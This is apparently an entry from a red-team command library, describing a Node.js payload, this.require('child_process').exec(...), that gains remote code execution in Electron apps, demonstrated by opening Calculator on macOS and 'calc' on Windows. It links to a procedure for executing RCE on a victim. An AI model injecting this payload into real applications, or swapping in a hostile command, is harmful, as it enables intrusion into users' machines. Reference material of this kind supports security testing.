---
data: this.require("child_process").exec("open /Applications/Calculator.app")
tags:
  - rce
  - nodejs
type: command
executor: javascript
platforms:
  - Electron
id: 88fcd045-f8ee-4e39-a61e-75fec3df3063
created_at: '2025-12-11T06:10:22.490Z'
updated_at: '2025-12-11T06:10:22.490Z'
verified: false
validated: true
submitted: true
---
# exec-shell-command-nodejs

## Command

```javascript
this.require("child_process").exec("open /Applications/Calculator.app")
```

## Description

Executes a shell command via Node.js child_process in the Electron context for RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `exec` | Executes the given command | Yes |

## Examples

### Basic Usage

```javascript
this.require("child_process").exec("open /Applications/Calculator.app")
```

### Advanced Usage

```javascript
this.require("child_process").exec("calc")
```

## Expected Output

The specified command executes on the host OS.

## Related

- [[commands/open-calculator-macos]]
- [[procedures/Execute-RCE-on-Victim-Interaction]]
